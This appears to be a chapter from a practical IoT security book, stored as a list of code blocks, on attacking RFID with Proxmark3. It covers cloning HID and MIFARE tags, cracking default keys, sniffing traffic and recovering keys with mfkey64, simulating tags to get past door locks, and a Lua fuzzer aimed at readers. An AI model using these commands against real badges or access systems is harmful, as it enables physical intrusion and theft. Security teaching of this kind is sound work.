["```\n$ **sudo apt install git build-essential libreadline5 libreadline-dev gcc-arm-none-eabi libusb-0.1-4 libusb-dev libqt4-dev ncurses-dev perl pkg-config libpcsclite-dev pcscd**\n```", "```\n$ **git clone [https://github.com/Proxmark/proxmark3.git](https://github.com/Proxmark/proxmark3.git)**\n$ **cd proxmark3**\n$ **make clean && make all**\n```", "```\n$ **dmesg**\n[44643.237094] usb 1-2.2: new full-speed USB device number 5 using uhci_hcd\n[44643.355736] usb 1-2.2: New USB device found, idVendor=9ac4, idProduct=4b8f, bcdDevice= 0.01\n[44643.355738] usb 1-2.2: New USB device strings: Mfr=1, Product=2, SerialNumber=0\n[44643.355739] usb 1-2.2: Product: proxmark3\n[44643.355740] usb 1-2.2: Manufacturer: proxmark.org\n[44643.428687] cdc_acm 1-2.2:1.0: ttyACM0: USB ACM device\n```", "```\n$ **./client/flasher /dev/ttyACM0 -b ./bootrom/obj/bootrom.elf**\nLoading ELF file '../bootrom/obj/bootrom.elf'...\nLoading usable ELF segments:\n0: V 0x00100000 P 0x00100000 (0x00000200->0x00000200) [R X] @0x94\n1: V 0x00200000 P 0x00100200 (0x00000c84->0x00000c84) [R X] @0x298\nWaiting for Proxmark to appear on /dev/ttyACM0 .\nFound.\nFlashing...\nWriting segments for file: ../bootrom/obj/bootrom.elf\n0x00100000..0x001001ff [0x200 / 1 blocks]. OK\n0x00100200..0x00100e83 [0xc84 / 7 blocks]....... OK\nResetting hardware...\nAll done.\nHave a nice day!\n```", "```\n# **systemctl stop ModemManager**\n# **systemctl disable ModemManager**\n```", "```\n#**./****client/flasher /dev/ttyACM0 armsrc/obj/fullimage.elf**\nLoading ELF file 'armsrc/obj/fullimage.elf'...\nLoading usable ELF segments:\n0: V 0x00102000 P 0x00102000 (0x0002ef48->0x0002ef48) [R X] @0x94\n1: V 0x00200000 P 0x00130f48 (0x00001908->0x00001908) [RW ] @0x2efdc\nNote: Extending previous segment from 0x2ef48 to 0x30850 bytes\nWaiting for Proxmark to appear on /dev/ttyACM0 .\nFound.\nFlashing...\nWriting segments for file: armsrc/obj/fullimage.elf\n0x00102000..0x0013284f [0x30850 / 389 blocks]......... OK\nResetting hardware...\nAll done.\nHave a nice day!\n```", "```\n$ ./**pm3-flash-all**\n```", "```\n# **./client/proxmark3 /dev/ttyACM0**\nProx/RFID mark3 RFID instrument          \nbootrom: master/v3.1.0-150-gb41be3c-suspect 2019-10-29 14:22:59\nos: master/v3.1.0-150-gb41be3c-suspect 2019-10-29 14:23:00\nfpga_lf.bit built for 2s30vq100 on 2015/03/06 at 07:38:04\nfpga_hf.bit built for 2s30vq100 on 2019/10/06 at 16:19:20\nSmartCard Slot: not available\nuC: AT91SAM7S512 Rev B          \nEmbedded Processor: ARM7TDMI          \nNonvolatile Program Memory Size: 512K bytes. Used: 206927 bytes (39%). Free: 317361 bytes (61%).          \nSecond Nonvolatile Program Memory Size: None          \nInternal SRAM Size: 64K bytes          \nArchitecture Identifier: AT91SAM7Sxx Series          \nNonvolatile Program Memory Type: Embedded Flash Memory          \nproxmark3>\n```", "```\nproxmark3> **lf search** \nChecking for known tags: \nValid Hitag2 tag found - UID: 01080100 \n```", "```\nproxmark3> **hf search** \nUID:               E0040150686F4CD5          \nManufacturer byte: 04, NXP Semiconductors Germany          \nChip ID:           01, IC SL2 ICS20/ICS21(SLI) ICS2002/ICS2102(SLIX)          \nValid ISO15693 Tag Found - Quiting Search\n```", "```\nproxmark3> **lf search**\nChecking for known tags:\nHID Prox TAG ID: 2004246b3a (13725) - Format Len: 26bit - FC: 18 - Card: 13725          \n[+] Valid HID Prox ID Found!\n```", "```\nproxmark3> **lf hid**\nhelp            this help          \ndemod        demodulate HID Prox tag from the GraphBuffer          \nread            attempt to read and extract tag data          \nclone          clone HID to T55x7          \nsim             simulate HID tag         \nwiegand     convert facility code/card number to Wiegand code          \nbrute          bruteforce card number against reader \n```", "```\nproxmark3> **lf hid read**\nHID Prox TAG ID: 2004246b3a (13725) - Format Len: 26bit - FC: 18 - Card: 13725\n```", "```\nproxmark3> **lf hid clone 2004246b3a**\nCloning tag with ID 2004246b3a \n```", "```\nproxmark3> **hf mf**\nhelp                This help          \ndarkside         Darkside attack. read parity error messages.          \nnested             Nested attack. Test nested authentication          \nhardnested     Nested attack for hardened MIFARE cards          \nkeybrute         J_Run's 2nd phase of multiple sector nested authentication key recovery          \nnack               Test for MIFARE NACK bug          \nchk                 Check keys          \nfchk                Check keys fast, targets all keys on card          \ndecrypt           [nt] [ar_enc] [at_enc] [data] - to decrypt snoop or trace          \n-----------                \ndbg                 Set default debug mode   \n…\n```", "```\n$ proxmark3> **hf mf chk *1 ?** **t****./client/****default_keys.dic**\n--chk keys. sectors:16, block no:  0, key type:B, eml:n, dmp=y checktimeout=471 us          \nchk custom key[ 0] FFFFFFFFFFFF          \nchk custom key[ 1] 000000000000          \n…          \nchk custom key[91] a9f953def0a3          \nTo cancel this operation press the button on the proxmark...          \n--o.          \n|---|----------------|---|----------------|---|          \n|sec|key A           |res|key B           |res|          \n|---|----------------|---|----------------|---|          \n|000|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          \n|001|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          \n|002|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          \n|003|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |           \n…\n|014|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          \n|015|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          \n|---|----------------|---|----------------|---|          \n32 keys(s) found have been transferred to the emulator memory \n```", "```\nFound keys have been dumped to file dumpkeys.bin. \n```", "```\nproxmark3> hf mf fchk 1 t\n[+] No key specified, trying default keys          \n[ 0] FFFFFFFFFFFF          \n[ 1] 000000000000          \n[ 2] a0a1a2a3a4a5          \n[ 3] b0b1b2b3b4b5          \n…\n```", "```\nproxmark3> **hf mf rdbl 0 A FFFFFFFFFFFF**\n--block no:0, key type:A, key:FF FF FF FF FF FF            \ndata: B4 6F 6F 79 CD 08 04 00 01 2A 51 62 0B D9 BB 1D \n```", "```\nproxmark3> **hf mf rdsc 0 A FFFFFFFFFFFF**\n--sector no:0 key type:A key:FF FF FF FF FF FF            \nisOk:01          \ndata   : B4 6F 6F 79 CD 08 04 00 01 2A 51 62 0B D9 BB 1D           \ndata   : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           \ndata   : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           \ntrailer: 00 00 00 00 00 00 FF 07 80 69 FF FF FF FF FF FF           \nTrailer decoded:          \nAccess block 0: rdAB wrAB incAB dectrAB          \nAccess block 1: rdAB wrAB incAB dectrAB          \nAccess block 2: rdAB wrAB incAB dectrAB          \nAccess block 3: wrAbyA rdCbyA wrCbyA rdBbyA wrBbyA          \nUserData: 69 \n```", "```\nproxmark3> **hf mf dump** **1**\n[=] Reading sector access bits...          \n...\n[+] Finished reading sector access bits          \n[=] Dumping all blocks from card...          \n[+] successfully read block  0 of sector  0\\.          \n[+] successfully read block  1 of sector  0\\.          \n...         \n[+] successfully read block  3 of sector 15\\.          \n[+] time: 35 seconds\n[+] Succeeded in dumping all blocks\n[+] saved 1024 bytes to binary file hf-mf-B46F6F79-data.bin \n```", "```\nproxmark3> **hf mf restore**\n[=] Restoring hf-mf-B46F6F79-data.bin  to card          \nWriting to block   0: B4 6F 6F 79 CD 08 04 00 01 2A 51 62 0B D9 BB 1D           \n[+] isOk:00          \nWriting to block   1: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           \n[+] isOk:01          \nWriting to block   2: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           \n…\nWriting to block  63: FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF           \n[+] isOk:01          \n[=] Finish restore\n```", "````` ````### Simulating RFID Tags    In the previous examples, we cloned an RFID tag by storing the legitimate tag’s data in files using the `dump` command and using a new card to restore the extracted data. But it’s also possible to simulate an RFID tag using Proxmark3 by extracting the data directly from the device’s memory.    Load the previously stored contents of a MIFARE tag into the Proxmark3 memory using the `eload` parameter. Specify the name of the .*eml* file in which the extracted data is stored:    ``` proxmark3> **hf mf eload** **hf-mf-B46F6F79-data** ```    Note that this command occasionally fails to transfer the data from all stored sectors to the Proxmark3 memory. In that case, you’ll receive an error message. Using the command two or more times should solve this bug and complete the transfer successfully.    To simulate the RFID tag using data from the device’s memory, use the `sim` parameter:    ``` proxmark3> **hf mf sim *1 u 8c61b5b4**  mf sim cardsize: 1K, uid: 8c 61 b5 b4 , numreads:0, flags:3 (0x03)            #db# 4B UID: 8c61b5b4           #db# SAK:    08           #db# ATQA:   00 04  ```    The *** character selects all the tag’s blocks, and the number that follows it specifies the memory size (in this case, `1` for MIFARE Classic 1KB). The `u` *parameter specifies the impersonated RFID tag’s UID.*   *Many IoT devices, such as smart door locks, use the tag’s UID to perform access control. These locks rely on a list of tag UIDs associated with specific people allowed to open the door. For example, a lock on an office door might open only when an RFID tag with the UID `8c61b5b4`—known to belong to a legitimate employee—is in proximity.    You might be able to guess a valid UID by simulating tags with random UID values. This could work if the tags you’re targeting use low entropy UIDs that are subject to collisions.    ### Altering RFID Tags    In certain cases, it’s useful to alter the contents of a tag’s specific block or sector. For example, a more advanced office door lock won’t just check for the UID of the tag in range; it will also check for a specific value, associated with a legitimate employee, in one of the tag’s blocks. As in the example from “Simulating RFID Tags” on page 254, selecting an arbitrary value might allow you to circumvent the access control.    To change a specific block of a MIFARE tag maintained in the Proxmark3’s memory, use the `eset` parameter, followed by the block number and the content that you want to add to the block, in hex. In this example, we’ll set the value `000102030405060708090a0b0c0d0e0f` on block number `01`:    ``` proxmark3> **hf mf eset 01 000102030405060708090a0b0c0d0e0f** ```    To verify the result, use the `eget` command, followed by the block number again:    ``` proxmark3> **hf mf eget 01** data[  1]:00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f  ```    Now it’s possible to use the `sim` command once more to simulate the altered tag. You can also alter the memory contents of the legitimate physical tag using the `wrbl` parameter, followed by the block number, the type of key to use (`A` or`B`), the key—which in our case is the default `FFFFFFFFFFFF`—and the content in hex:    ``` proxmark3> **hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f** --block no:1, key type:B, key:ff ff ff ff ff ff            --data: 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f            #db# WRITE BLOCK FINISHED           isOk:01  ```    Verify that the specific block was written using the `rdbl` parameter, followed by the block number 01 with a type B key `FFFFFFFFFFFF`:    ``` proxmark3> **hf mf rdbl 01 B FFFFFFFFFFFF** **--block no:1, key type:B, key:ff ff ff ff ff ff**  **#db# READ BLOCK FINISHED**  isOk:01 data:00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f ```    The output contains the same contents in hex that you wrote to that block.    ### Attacking MIFARE with an Android App    On Android phones, you can run apps that attack MIFARE cards. One common app for this is the MIFARE Classic Tool, which uses a preloaded list of keys to brute force the key values and read the card data. You can then save the data to emulate the device in the future.    To read a nearby tag, click the **READ TAG** button in the app’s main menu. A new interface should appear. From here, you can select a list containing the default keys to test and a progress bar, as shown in [Figure 10-6](#figure10-6).    Save this data to a new record by clicking the floppy disk icon on the top of the interface. To clone the tag, click the **WRITE TAG** button on the main menu. In the new interface, select the record by clicking the **SELECT DUMP** button and write it to a different tag.  ![f10006](Images/f10006.png)    Figure 10-6: The MIFARE Classic Tool interface for Android devices      After a successful read operation, the app lists the data retrieved from all the blocks, as shown in [Figure 10-7](#figure10-7).  ![f10007](Images/f10007.png)    Figure 10-7: Cloning an RFID tag      ### RAW Commands for Nonbranded or Noncommercial RFID Tags    In the previous sections, we used vendor-specific commands to control commercial RFID tags with Proxmark3\\. But IoT systems sometimes use nonbranded or noncommercial tags. In this case, you can use Proxmark3 to send custom raw commands to the tags. Raw commands are very useful when you’re able to retrieve command structures from a tag’s datasheet and those commands aren’t yet implemented in Proxmark3.    In the following example, instead of using the`hf mf`command as we did in previous sections, we’ll use raw commands to read a MIFARE Classic 1KB tag.    #### Identifying the Card and Reading Its Specification    First, use the `hf search` command to verify that the tag is in range:    ``` proxmark3> **hf search**      UID : 80 55 4b 6c            ATQA : 00 04           SAK : 08 [2]           TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1           proprietary non iso14443-4 card found, RATS not supported           No chinese magic backdoor command detected           Prng detection: WEAK           Valid ISO14443A Tag Found - Quiting Search ```    Next, check the card’s specification, which you can find at the vendor’s site ([https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf](https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf) and [https://www.nxp.com/docs/en/application-note/AN10833.pdf](https://www.nxp.com/docs/en/application-note/AN10833.pdf)). According to the specification, to establish a connection with the card and perform a memory operation, we must follow the protocol shown in [Figure 10-8](#figure10-8).    The protocol requires four commands to establish an authenticated connection with the MIFARE tag. The first command, *Request all* or *REQA*, forces the tag to respond with a code that includes the tag’s UID size. In the *Anti-collision loop* phase, the reader requests the UIDs of all the tags in the operating field, and in the *Select card* phase, it selects an individual tag for further transactions. The reader then specifies the tag’s memory location for the memory access operation and authenticates using the corresponding key. We’ll describe the authentication process in “Extracting a Sector’s Key from the Captured Traffic” on page 261.    #### Sending Raw Commands    Using raw commands requires you to manually send each specific byte of the command (or part of it), the corresponding command’s data, and, eventually, the CRC bytes for cards that require error detection. For example, Proxmark3’s `hf 14a raw` command allows you to send ISO14443A commands to an ISO14443A compatible tag. You then provide the raw commands in hex after the `-p`parameter.  ![f10008](Images/f10008.png)    Figure 10-8: MIFARE tags authentication protocol      You’ll need the hex opcodes for the commands you want to use. You can find these in the card’s specification. These opcodes correspond to the authentication protocol steps shown in [Figure 10-8](#figure10-8).    First, use the `hf 14a``raw` command with the `–p` parameter. Then send the *Request all* command, which corresponds to the hex opcode `26`. According to the specification, this command requires 7 bits, so use the `-b 7` parameter to define the maximum number of bits you’ll use. The default value is 8 bits.    ``` proxmark3> **hf 14a raw -p -b 7 26** received 2 bytes:           04 00  ```    The device responds with a success message, named *ATQA*, with the value `0x4`. This byte indicates that the UID size is four bytes. The second command is the *Anti-collision* command*,* which corresponds to the hex opcode `93 20`:    ``` proxmark3> **hf 14a raw -p 93 20** received 5 bytes:           80 55 4B 6C F2  ```    The device responds with the device UID `80 55 4b 6c`. It also returns a byte generated by performing a XOR operation on all the previous bytes as an integrity protection. We now have to send the `SELECT Card` command, which corresponds to hex opcode `93 70`, followed by the previous response, which contains the tag’s UID:    ``` proxmark3> **hf 14a raw -p -c 93 70 80 55 4B 6C F2** received 3 bytes:           08 B6 DD  ```    Finally, you’re ready to authenticate with a type A sector key, which corresponds to hex opcode `60`, and the default password for sector `00`:    ``` proxmark3> **hf 14a raw -p -c 60 00** received 4 bytes:           5C 06 32 57 ```    Now you can proceed with the other memory operations listed in the specification, such as reading a block. We leave this as an exercise for you to complete.    ### Eavesdropping on the Tag-to-Reader Communication    Proxmark3 can eavesdrop on transactions between a reader and a tag. This operation is extremely useful if you want to examine the data a tag and an IoT device exchanges.    To start eavesdropping on the communication channel, place the Proxmark3 antenna between the card and the reader, select either a high-frequency or a low-frequency operation, specify the tag implementation, and use the `snoop` parameter. (Some vendor-specific tags, implementations use the `sniff` parameter instead.)    In the following example, we attempt to eavesdrop on an ISO14443A-compatible tag, so we select the `14a` parameter:    ``` $ proxmark3> **hf 14a snoop** #db# cancelled by button           #db# COMMAND FINISHED           #db# maxDataLen=4, Uart.state=0, Uart.len=0           #db# traceLen=11848, Uart.output[0]=00000093 ```    We interrupt the capture by pressing the Proxmark3’s button when the communication between the card and the reader ends.    To retrieve the captured packets, specify either a high-frequency or a low-frequency operation, the `list` parameter, and the tag implementation:    ``` proxmark3> **hf list 14a** Recorded Activity (TraceLen = 11848 bytes)           Start = Start of Start Bit, End = End of last modulation. Src = Source of Transfer           iso14443a - All times are in carrier periods (1/13.56Mhz)           iClass    - Timings are not as accurate …     0 |992 | Rdr | 52' | | WUPA   2228 |   4596 | Tag | 04  00  | |    7040 |   9504 | Rdr | 93  20  | | ANTICOLL   10676 |  16564 | Tag | 80  55  4b  6c  f2  | |    19200 |  29728 | Rdr | 93  70  80  55  4b  6c  f2  30  df  |  ok | SELECT_UID   30900 |  34420 | Tag | 08  b6  dd  | |    36224 |  40928 | Rdr | 60  00  f5  7b  |  ok | AUTH-A(0)   42548 |  47220 | Tag | 63  17  ec  f0  | |    56832 |  66208 | Rdr | 5f! 3e! fb  d2  94! 0e! 94  6b  | !crc| ?   67380 |  72116 | Tag | 0e  2b  b8  3f! | |    … ```    The output will also decode the identified operations. The exclamation points near the hex bytes indicate that a bit error occurred during the capture.    ### Extracting a Sector’s Key from the Captured Traffic    Eavesdropping on RFID traffic can reveal sensitive information, particularly when the tags use weak authentication controls or unencrypted communication channels. Because the MIFARE Classic tags use a weak authentication protocol, you can extract a sector’s private key by capturing a single successful authentication between the RFID tag and the RFID reader.    According to the specification, MIFARE Classic tags perform a three-pass authentication control with the RFID reader for each requested sector. First, the RFID tag selects a parameter called `nt` and sends it to the RFID reader. The RFID reader performs a cryptographic operation using the private key and received parameter. It generates an answer, called `ar`. Next, it selects a parameter called `nr` and sends it to the RFID tag along with `ar`. Then the tag performs a similar cryptographic operation with the parameters and the private key, generating an answer, called `at`, that it sends back to the RFID tag reader. Because the cryptographic operations that the reader and the tag perform are weak, knowing these parameters allows you to calculate the private key!    Let’s examine the eavesdropping communications captured in the previous section to extract these exchanged parameters:    ``` proxmark3> **hf list 14a** Start = Start of Start Bit, End = End of last modulation. Src = Source of Transfer           iso14443a - All times are in carrier periods (1/13.56Mhz)           iClass    - Timings are not as accurate               Start |End | Src | Data (! denotes parity error, ' denotes short bytes)| CRC | Annotation |      ------------|------------|-----|--------------------------------------------------------------       0 |992 | Rdr | 52' | | WUPA      2228 |   4596 | Tag | 04  00  | |       7040 |   9504 | Rdr | 93  20  | | ANTICOLL      10676 |  16564 | Tag | **80  55  4b  6c**  f2  | | 1    19200 |  29728 | Rdr | 93  70  80  55  4b  6c  f2  30  df  |  ok | SELECT_UID      30900 |  34420 | Tag | 08  b6  dd  | |       36224 |  40928 | Rdr | 60  00  f5  7b  |  ok | AUTH-A(0)      42548 |  47220 | Tag | **63  17  ec  f0**  | | 2    56832 |  66208 | Rdr | **5f! 3e! fb  d2****94! 0e! 94  6b**  | !crc| ? 3    67380 |  72116 | Tag | **0e  2b  b8  3f!** | | 4 ```    We can identify the card’s UID 1 as the value that comes before the `SELECT_UID` command. The `nt`2, `nr`, `ar`3, and `at`4 parameters appear just after the `AUTH-A(0)` command, always in this order.    Proxmark3’s source code includes a tool named `mfkey64` that can perform the cryptographic calculation for us. Pass it the card’s UID, followed by the `nt`, `nr`, `ar`, and `at` parameters:    ``` $ **./tools/mfkey/mfkey64 80554b6c 6317ecf0 5f3efbd2 940e946b 0e2bb83f** MIFARE Classic key recovery - based on 64 bits of keystream Recover key from only one complete authentication! Recovering key for:    uid: 80554b6c     nt: 6317ecf0   {nr}: 5f3efbd2   {ar}: 940e946b   {at}: 0e2bb83f LFSR successors of the tag challenge:   nt' : bb2a17bc   nt'': 70010929 Time spent in lfsr_recovery64(): 0.09 seconds Keystream used to generate {ar} and {at}:    ks2: 2f2483d7    ks3: 7e2ab116 **Found Key: [****FFFFFFFFFFFF****]**1 ```    If the parameters are correct, the tool calculates the private key 1 for the sector.    ### The Legitimate RFID Reader Attack    In this section, we’ll show you how to spoof a legitimate RFID tag and perform a brute-force attack against the RFID reader’s authentication control. This attack is useful in cases where you have prolonged access to the legitimate reader and limited access to the victim’s tag.    As you might have noticed, the legitimate tag will send the`at` response to the legitimate reader only at the end of the three-pass authentication. Adversaries who have physical access to the reader could spoof the RFID tag, generate their own `nt`*,* and receive the `nr` and `ar` from the legitimate reader. Although the authentication session can’t successfully terminate, because the adversaries don’t know the sector’s key, they might be able to perform a brute-force attack for the rest of the parameters and calculate the key.    To perform the legitimate reader attack, use the tag simulation command `hf mf sim`:    ``` proxmark3> **hf mf sim *1 u 19349245 x i** mf sim cardsize: 1K, uid: 19 34 92 45 , numreads:0, flags:19 (0x13)            Press pm3-button to abort simulation     #db# Auth attempt {nr}{ar}: c67f5ca8 68529499           Collected two pairs of AR/NR which can be used to extract keys from reader: … ```    The *** character selects all the tag blocks. The number that follows specifies the memory size (in this case, `1` for MIFARE Classic 1KB). The `u` parameter lists the impersonated RFID tag’s UID, and the `x` parameter enables the attack. The `i`parameter allows the user to have an interactive output.    The command’s output will contain the `nr` and `ar` values, which we can use to perform the key calculation in the same way as we did in the previous section. Note that even after calculating the sector’s key, we’d have to gain access to the legitimate tag to read its memory.    ### Automating RFID Attacks Using the Proxmark3 Scripting Engine    The Proxmark3 software comes with a preloaded list of automation scripts that you can use to perform simple tasks. To retrieve the full list, use the `script list` command:    ``` $ proxmark3> **script list** brutesim.lua     A script file           tnp3dump.lua     A script file           … dumptoemul.lua   A script file           mfkeys.lua       A script file           test_t55x7_fsk.lua A script file ```    Next, use the `script run` command, followed by the script’s name, to run one of the scripts. For example, the following command executes `mfkeys`, which uses the techniques presented earlier in the chapter (see “Cracking the Keys with a Brute-Force Attack” on page 252) to automate the brute-force attack of a MIFARE Classic card:    ``` $ proxmark3> **script run mfkeys** --- Executing: mfkeys.lua, args '' This script implements check keys.  It utilises a large list of default keys (currently 92 keys). If you want to add more, just put them inside mf_default_keys.lua.  Found a NXP MIFARE CLASSIC 1k | Plus 2k tag Testing block 3, keytype 0, with 85 keys … Do you wish to save the keys to dumpfile? [y/n] ? ```    Another very helpful script is `dumptoemul`, which transforms a .*bin* file created from the dump command to a .*eml* file that you can directly load to the Proxmark3 emulator’s memory:    ``` proxmark3> **script run dumptoemul -i dumpdata.bin -o CEA0B6B4.eml** --- Executing: dumptoemul.lua, args '-i dumpdata.bin -o CEA0B6B4.eml' Wrote an emulator-dump to the file CEA0B6B4.eml -----Finished ```    The `-i` parameter defines the input file, which in our case is *dumpdata.bin*, and the `-o`parameter specifies the output file.    These scripts can be very useful when you have physical access to an RFID-enabled IoT device for only a limited amount of time and want to automate a large number of testing operations.    ### RFID Fuzzing Using Custom Scripting    In this section, we’ll show you how to use Proxmark3’s scripting engine to perform a simple mutation-based fuzzing campaign against an RFID reader. Fuzzers iteratively or randomly generate inputs to a target, which can lead to security issues. Instead of trying to locate known defects in an RFID-enabled system, you can use this process to identify new vulnerabilities in the implementation.    Mutation-based fuzzers generate inputs by modifying an initial value, called the *seed,* which is usually a normal payload. In our case, this seed can be a valid RFID tag that we’ve successfully cloned. We’ll create a script that automates the process of connecting to an RFID reader as this legitimate tag and then hide invalid, unexpected, or random data in its memory blocks. When the reader tries to process the malformed data, an unexpected code flow might execute, leading to application or device crashes. The errors and exceptions can help you identify severe loopholes in the RFID reader application.    We’ll target an Android device’s embedded RFID reader and the software that receives the RFID tag data. (You can find many RFID reading apps in the Android Play Store to use as potential targets.) We’ll write the fuzzing code using Lua. You can find the full source code in the book’s repository. In addition, you can find more information about Lua in Chapter 5\\.    To begin, save the following script skeleton in the Proxmark3 *client/scripts* folder using the name *fuzzer.lua.* This script, which has no functionality, will now appear when you use the `script list` command:    ``` File: fuzzer.lua author = \"Book Authors\" desc = \"This is a script for simple fuzzing of NFC/RFID implementations\"  function main(args) end  main() ```    Next, extend the script so it uses Proxmark3 to spoof a legitimate RFID tag and establish a connection with the RFID reader. We’ll use a tag that we’ve already read, exported to a .*bin* file using the `dump` command, and transformed to a .*eml* file using the *dumptoemul* script. Let’s assume that this file is named *CEA0B6B4.eml*.    First, we create a local variable named `tag` to store the tag data:    ``` local tag = {} ```    Then we create the`load_seed_tag()` function*,* which loads the stored data from the *CEA0B6B4.eml* file to the Proxmark3 emulator’s memory, as well as to the previously created local variable named `tag`:    ``` function load_seed_tag()     print(\"Loading seed tag...\").        core.console(\"hf mf eload CEA0B6B4\") 1     os.execute('sleep 5')      local infile = io.open(\"CEA0B6B4.eml\", \"r\")     if infile == nil then          print(string.format(\"Could not read file %s\",tostring(input)))     end     local t = infile:read(\"*all\")     local i = 0     for line in string.gmatch(t, \"[^\\n]+\") do          if string.byte(line,1) ~= string.byte(\"+\",1) then            tag[i] = line 2            i = i + 1         end     end end ```    To load a .*eml* file in Proxmark3 memory, we use the `eload` 1 parameter. You can use Proxmark3 commands by providing them as arguments in the `core.console()` function call. The next part of the function manually reads the file, parses the lines, and appends the content to the `tag`2 variable. As mentioned earlier, the `eload` command occasionally fails to transfer the data from all the stored sectors to the Proxmark3 memory, so you might have to use it more than once.    Our simplified fuzzer will mutate the initial `tag` value, so we need to write a function that creates random changes in the original RFID tag’s memory. We use a local variable named `charset` to store the available hex characters that we can use to perform these changes:    ``` local charset = {} do      for c = 48, 57  do table.insert(charset, string.char(c)) end     for c = 97, 102  do table.insert(charset, string.char(c)) end end ```    To fill the `charset` variable, we perform an iteration on the ASCII representation of the characters 0 to 9 and a to f. Then we create the function `randomize()` that uses the characters stored in the previous variable to create mutations on the emulated tag:    ``` function randomize(block_start, block_end)     local block = math.random(block_start, block_end) 1     local position = math.random(0,31) 2     local value = charset[math.random(1,16)] 3  print(\"Randomizing block \" .. block .. \" and position \" .. position)      local string_head = tag[block]:sub(0, position)  local string_tail = tag[block]:sub(position+2)     tag[block] = string_head .. value .. string_tail      print(tag[block])     core.console(\"hf mf eset \" .. block .. \" \" .. tag[block]) 4     os.execute('sleep 5') end ```    More precisely, this function randomly selects a tag’s memory block 1 and a position on each selected block 2, and then introduces a new mutation by replacing this character with a random value 3 from `charset`. We then update the Proxmark3 memory using the `hf mf eset` 4 command.    Then we create a function named `fuzz()` that repeatedly uses the `randomize()` function to create a new mutation on the seed RFID tag data and emulates the tag to the RFID reader:    ``` function fuzz()  1 core.clearCommandBuffer()  2 core.console(\"hf mf dbg 0\")     os.execute('sleep 5')  3 while not core.ukbhit() do         randomize(0,63)      4 core.console(\"hf mf sim *1 u CEA0B6B4\")     end     print(\"Aborted by user\") end ```    The `fuzz()` function also uses the `core.clearCommandBuffer()` API call 1 to clear any remaining commands from Proxmark3 commands queue and uses the `hf mf dbg`2command to disable the debugging messages. It performs the fuzzing repeatedly, using a `while` loop, until the user presses the Proxmark3 hardware button. We detect this using the `core.ukbhit()`3 API call. We implement the simulation using the `hf mf sim`4 command.    Then we add the functions to the original script skeleton in *fuzzer.lua* and change the main function to call the `load_seed_tag()` and `fuzz()` functions:    ``` File: fuzzer.lua author = \"Book Authors\" desc = \"This is a script for simple fuzzing of NFC/RFID implementations\"      …Previous functions.. function main(args)       load_seed_tag()      fuzz() end main() ```    To start the fuzzing campaign, place the Proxmark3 antenna close to the RFID reader, which is usually located at the back of the Android device. [Figure 10-9](#figure10-9) shows this setup.  ![f10009](Images/f10009.png)    Figure 10-9: Fuzzing the RFID reader in an Android device      Then execute the `script run fuzzer` command:    ``` proxmark3> **script run fuzzer** Loading seed tag...        ........................................................... Loaded 64 blocks from file: CEA0B6B4.eml           #db# Debug level: 0           Randomizing block 6 and byte 19 00000000000000000008000000000000 mf sim cardsize: 1K, uid: ce a0 b6 b4 , numreads:0, flags:2 (0x02)            Randomizing block 5 and byte 8 636f6dfe600000000000000000000000 mf sim cardsize: 1K, uid: ce a0 b6 b4 , numreads:0, flags:2 (0x02)            Randomizing block 5 and byte 19 636f6dfe600000000004000000000000 ... ```    The output should contain the exact mutation that occurs in each data exchange with the reader. In each established communication, the reader will attempt to retrieve and parse the mutated tag data. Depending on the mutation, these inputs can affect the reader’s business logic, leading to undefined behavior or even application crashes. In the worst-case scenario, an RFID-enabled door lock hosting an access-control software might crash upon receiving the mutated input, allowing anyone to freely open the door.    We can evaluate the success of our fuzzer through experimentation. We’d measure the number of possibly exploitable bugs identified by crashing inputs. Note that this script is a simplified fuzzer that follows a naive approach: it uses simple random numbers to create the mutations in the given inputs. As a result, we don’t expect it to be very efficient at identifying software crashes. Less naive solutions would use improved mutations, map out the protocol to be fuzzed in detail, or even leverage program analysis and instrumentation techniques to interact with a greater amount of the reader’s code. This would require meticulously examining the documentation and constantly improving your fuzzer. For this purpose, try advanced fuzzing tools, such as the American Fuzzy Lop (AFL) or libFuzzer. This task is beyond the scope of this book, and we leave it as an exercise for you to complete.    ## Conclusion    In this chapter, we investigated RFID technology and covered a number of cloning attacks against common low-frequency and high-frequency RFID implementations. We examined how to retrieve a key to access the password-protected memory of the MIFARE Classic cards and then read and alter their memory. Finally, we walked through a technique that allows you to send raw commands to any type of ISO14493-compatible RFID tag based on its specification, and we used the Proxmark3 scripting engine to create a simplified fuzzer for RFID readers.*```` `````"]